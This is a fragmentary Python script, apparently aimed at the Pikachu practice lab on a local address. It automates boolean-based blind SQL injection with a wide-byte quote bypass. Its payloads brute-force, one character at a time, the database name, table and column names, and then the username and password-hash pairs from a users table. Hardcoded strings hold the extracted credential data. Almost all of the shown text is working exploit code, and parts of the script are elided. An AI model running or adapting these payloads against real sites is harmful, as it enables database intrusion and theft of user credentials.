...
url = "http://127.0.0.12/vul/sqli/sqli_blind_b.php"
headers = {
    ...
    while True:
        if j > k and j < n and j - k > 3:
            payload1 = "name=lili%df' or length(database())>" + str(
                j) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"  # 所有payload根据实际情况填写，必须是字符串形式
...
def TablesBool():
    res1,res2 = "38","HTTPINFO,MEMBER,MESSAGE,USER,XSSBLIND"
    return res1, res2
    ...
    while True:
        if j > k and j < n and j - k > 3:
            payload4 = "name=lili%df' or (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>" + str(
            ...
            for i in range(k - 1, n + 2):
                payload5 = "name=lili%df' or (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=" + str(
                    i) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
    ...
    for i in range(1, length + 1):
        for c in keylist:
            payload6 = "name=lili%df' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database())," + str(
                i) + ",1))=" + str(c) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
...
def ColumnsBool():
    res1,res2 = "40","ID,USERNAME,PASSWORD,LEVEL,USERNAME,PASS"
    return res1, res2
    ...
    while True:
        if j > k and j < n and j - k > 3:
            payload7 = "name=lili%df' or (length((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273)))>" + str(
                j) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
            ...
            for i in range(k - 1, n + 2):
                payload8 = "name=lili%df' or (length((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273)))=" + str(
                    i) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
    ...
    for i in range(1, length + 1):
        for c in keylist:
            payload9 = "name=lili%df' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273)," + str(
                i) + ",1))=" + str(c) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
...
def ContentBool():
    res1,res2 = "117","ADMINE1OADC3949BA59ABBE56EO57F20F883E,PIKACHU670B14728AD990AECBA32E22A4F6BD,TESTOB99418C4280B38D5F260853678922EO3"
    return res1, res2
    ...
    while True:
        if j > k and j < n and j - k > 3:
            payload10 = "name=lili%df' or (length((select group_concat(concat(username,0x7e,password)) from users)))>" + str(
                j) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
            ...
            for i in range(k - 1, n + 2):
                payload11 = "name=lili%df' or (length((select group_concat(concat(username,0x7e,password)) from users)))=" + str(
                    i) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
    ...
    for i in range(1, length + 1):
        for c in keylist:
            payload12 = "name=lili%df' or ascii(substr((select group_concat(concat(username,0x7e,password)) from users)," + str(
                i) + ",1))=" + str(c) + "-- ss&submit=%E6%9F%A5%E8%AF%A2"
